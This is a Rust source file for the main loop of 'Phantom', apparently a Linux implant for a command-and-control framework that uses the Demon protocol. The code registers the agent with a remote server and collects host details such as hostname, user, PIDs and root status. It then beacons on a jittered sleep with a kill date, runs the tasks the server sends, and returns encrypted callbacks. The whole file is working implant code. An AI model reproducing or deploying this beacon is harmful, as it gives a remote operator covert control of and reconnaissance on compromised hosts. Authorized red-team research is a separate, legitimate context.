//! Core Phantom agent loop and task dispatch.

use std::fs;
use std::path::PathBuf;

use red_cell_common::crypto::{
    AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
};
use red_cell_common::demon::DemonCommand;
use tracing::{info, warn};

use crate::command::{PendingCallback, PhantomState, execute};
use crate::config::PhantomConfig;
use crate::error::PhantomError;
use crate::protocol::{
    AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
    parse_tasking_response,
};
use crate::transport::HttpTransport;

/// Running Phantom session state.
#[derive(Debug)]
pub struct PhantomAgent {
    agent_id: u32,
    raw_crypto: AgentCryptoMaterial,
    session_crypto: AgentCryptoMaterial,
    config: PhantomConfig,
    transport: HttpTransport,
    send_ctr_offset: u64,
    recv_ctr_offset: u64,
    state: PhantomState,
}

impl PhantomAgent {
    /// Create a new agent with fresh per-session crypto material.
    pub fn new(config: PhantomConfig) -> Result<Self, PhantomError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1;
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            Some(secret) => {
                derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
            }
            None => raw_crypto.clone(),
        };
        let transport = HttpTransport::new(&config)?;

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            send_ctr_offset: 0,
            recv_ctr_offset: 0,
            state: PhantomState::default(),
        })
    }

    /// Return the current random agent identifier.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Collect Linux host metadata for `DEMON_INIT`.
    pub fn collect_metadata(&self) -> AgentMetadata {
        AgentMetadata {
            hostname: read_trimmed("/etc/hostname").unwrap_or_else(|| String::from("unknown")),
            username: std::env::var("USER").unwrap_or_else(|_| String::from("unknown")),
            domain_name: String::from("WORKGROUP"),
            internal_ip: String::from("127.0.0.1"),
            process_path: std::env::current_exe()
                .map(|path| path.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: 0,
            process_ppid: parent_pid(),
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: is_elevated(),
            base_address: 0,
            os_major: 6,
            os_minor: 8,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 0,
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: self.config.sleep_delay_ms,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.unwrap_or_default().max(0) as u64,
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }

    /// Perform the initial registration handshake.
    pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
        let response = self.transport.send(&packet).await?;
        self.recv_ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
        Ok(())
    }

    /// Send a `COMMAND_CHECKIN` and process the returned task stream.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;
        self.flush_pending_callbacks().await?;

        let payload = red_cell_common::demon::DemonMessage::new(vec![
            red_cell_common::demon::DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
        ])
        .to_bytes()?;
        let encrypted = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &self.session_crypto.key,
            &self.session_crypto.iv,
            self.send_ctr_offset,
            &payload,
        )?;
        let packet = red_cell_common::demon::DemonEnvelope::new(self.agent_id, encrypted.clone())?
            .to_bytes();

        let response = self.transport.send(&packet).await?;
        self.send_ctr_offset += callback_ctr_blocks(0);

        let tasking = parse_tasking_response(
            self.agent_id,
            &self.session_crypto,
            self.recv_ctr_offset,
            &response,
        )?;
        self.recv_ctr_offset = tasking.next_recv_ctr_offset;

        let mut exit_requested = false;
        for package in tasking.packages {
            execute(&package, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.send_ctr_offset,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                self.send_packet(packet).await?;
                self.send_ctr_offset += callback_ctr_blocks(payload.len());
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    /// Run the main callback loop until exit conditions are met.
    pub async fn run(&mut self) -> Result<(), PhantomError> {
        self.init_handshake().await?;
        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");

        loop {
            if self.kill_date_elapsed() {
                warn!("phantom kill date reached; exiting");
                break;
            }

            tokio::time::sleep(std::time::Duration::from_millis(self.compute_sleep_delay())).await;
            if self.checkin().await? {
                break;
            }
        }

        Ok(())
    }

    fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }

        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let jitter = rand::random::<u64>() % (jitter_range + 1);
        base.saturating_sub(jitter / 2) + jitter / 2
    }

    fn kill_date_elapsed(&self) -> bool {
        match self.config.kill_date {
            Some(kill_date) if kill_date > 0 => {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
                    .unwrap_or_default();
                now >= kill_date
            }
            _ => false,
        }
    }

    async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
        let _response = self.transport.send(&packet).await?;
        Ok(())
    }

    async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.send_ctr_offset,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.send_ctr_offset += callback_ctr_blocks(payload.len());
        }

        Ok(())
    }
}

fn read_trimmed(path: impl Into<PathBuf>) -> Option<String> {
    let path = path.into();
    fs::read_to_string(path).ok().map(|value| value.trim().to_string())
}

fn parent_pid() -> u32 {
    read_trimmed("/proc/self/status")
        .and_then(|contents| {
            contents
                .lines()
                .find_map(|line| line.strip_prefix("PPid:\t"))
                .and_then(|value| value.trim().parse::<u32>().ok())
        })
        .unwrap_or_default()
}

fn is_elevated() -> bool {
    read_trimmed("/proc/self/status").and_then(|contents| {
        contents.lines().find_map(|line| {
            line.strip_prefix("Uid:\t").and_then(|value| {
                value.split_whitespace().next().and_then(|first| first.parse::<u32>().ok())
            })
        })
    }) == Some(0)
}

#[cfg(test)]
mod tests {
    use super::PhantomAgent;
    use crate::config::PhantomConfig;

    #[test]
    fn agent_creation_succeeds() {
        let agent = PhantomAgent::new(PhantomConfig::default()).expect("agent");
        assert_ne!(agent.agent_id(), 0);
    }

    #[test]
    fn collect_metadata_uses_linux_defaults() {
        let agent = PhantomAgent::new(PhantomConfig::default()).expect("agent");
        let metadata = agent.collect_metadata();
        assert_eq!(metadata.domain_name, "WORKGROUP");
        assert!(metadata.process_pid > 0);
    }
}
